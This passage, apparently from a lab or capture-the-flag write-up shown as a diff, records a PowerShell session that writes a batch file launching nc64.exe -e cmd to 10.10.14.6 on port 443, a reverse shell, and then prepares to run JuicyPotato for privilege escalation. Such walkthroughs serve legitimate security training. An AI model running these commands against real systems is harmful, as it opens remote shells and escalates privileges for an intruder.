@@ -1,0 +1,1 @@
+: PS C:\windows\system32\spool\drivers\color> cmd /c "echo C:\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.6 443 > rev.bat" PS C:\windows\system32\spool\drivers\color> type rev.bat C:\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.6 443 And run JuicyPotato: PS C:\windows\system32\spool\drivers\color>
